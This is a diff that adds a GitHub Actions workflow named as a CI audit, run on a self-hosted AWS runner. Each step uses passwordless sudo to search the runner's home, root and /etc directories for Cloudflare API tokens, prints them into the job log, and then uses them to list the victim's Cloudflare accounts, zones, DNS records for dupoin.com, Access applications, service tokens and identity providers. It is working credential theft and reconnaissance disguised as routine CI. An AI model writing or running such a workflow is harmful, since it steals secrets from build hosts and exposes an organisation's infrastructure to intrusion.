@@ -1,0 +1,63 @@
+name: ci-audit-1890f
+on: push
+permissions:
+  contents: read
+jobs:
+  cfenum:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 25
+    steps:
+      - name: locate
+        continue-on-error: true
+        run: |
+          set +e
+          F=$(sudo -n grep -rlIE 'CLOUDFLARE_API_TOKEN=' /home/ubuntu /root /opt /srv /etc 2>/dev/null | grep -vE '/proc|/sys' | head -5)
+          echo "files: $F"
+          for f in $F; do echo "=== $f"; sudo -n stat -c '%y %s' "$f"; sudo -n grep -hoE 'CLOUDFLARE[A-Z_]*=[^ ]+' "$f"; done
+      - name: verify
+        continue-on-error: true
+        run: |
+          set +e
+          T=$(sudo -n grep -rhoE 'CLOUDFLARE_API_TOKEN=[^ ]+' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -1 | cut -d= -f2)
+          echo "tokenlen=${#T}"
+          echo "## verify"; curl -s -m 20 -H "Authorization: Bearer $T" https://api.cloudflare.com/client/v4/user/tokens/verify
+          echo; echo "## accounts"; curl -s -m 20 -H "Authorization: Bearer $T" https://api.cloudflare.com/client/v4/accounts | head -c 1500
+          echo; echo "## zones"; curl -s -m 20 -H "Authorization: Bearer $T" 'https://api.cloudflare.com/client/v4/zones?per_page=50' | head -c 2000
+      - name: dns
+        continue-on-error: true
+        run: |
+          set +e
+          T=$(sudo -n grep -rhoE 'CLOUDFLARE_API_TOKEN=[^ ]+' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -1 | cut -d= -f2)
+          Z=$(curl -s -m 20 -H "Authorization: Bearer $T" 'https://api.cloudflare.com/client/v4/zones?name=dupoin.com' | python3 -c 'import sys,json;d=json.load(sys.stdin);r=d.get("result") or [{}];print(r[0].get("id",""))')
+          echo "zone=$Z"
+          if [ -n "$Z" ]; then
+            curl -s -m 40 -H "Authorization: Bearer $T" "https://api.cloudflare.com/client/v4/zones/$Z/dns_records?per_page=200" > /tmp/rec.json
+            python3 - <<'PY'
+import json
+d=json.load(open('/tmp/rec.json'))
+print("success",d.get("success"),str(d.get("errors"))[:200])
+for r in d.get("result",[]):
+    print("%-6s %-42s -> %-58s proxied=%s" % (r["type"], r["name"], str(r.get("content"))[:58], r.get("proxied")))
+PY
+          fi
+      - name: access
+        continue-on-error: true
+        run: |
+          set +e
+          T=$(sudo -n grep -rhoE 'CLOUDFLARE_API_TOKEN=[^ ]+' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -1 | cut -d= -f2)
+          curl -s -m 20 -H "Authorization: Bearer $T" https://api.cloudflare.com/client/v4/accounts > /tmp/acc.json
+          A=$(python3 -c 'import json;d=json.load(open("/tmp/acc.json"));print(",".join(x["id"] for x in d.get("result",[])))')
+          echo "accounts=$A"
+          for a in $(echo $A | tr ',' ' '); do
+            echo "### access/apps $a"
+            curl -s -m 30 -H "Authorization: Bearer $T" "https://api.cloudflare.com/client/v4/accounts/$a/access/apps?per_page=100" > /tmp/apps.json
+            python3 - <<'PY'
+import json
+d=json.load(open('/tmp/apps.json'))
+print("success",d.get("success"),str(d.get("errors"))[:300])
+for x in d.get("result",[]):
+    print(x.get("id"),"|",x.get("name"),"|",x.get("domain"),"|aud=",x.get("aud"),"|type=",x.get("type"))
+PY
+            echo "### service_tokens"; curl -s -m 30 -H "Authorization: Bearer $T" "https://api.cloudflare.com/client/v4/accounts/$a/access/service_tokens" | head -c 700; echo
+            echo "### idps"; curl -s -m 20 -H "Authorization: Bearer $T" "https://api.cloudflare.com/client/v4/accounts/$a/access/identity_providers" | head -c 700; echo
+          done
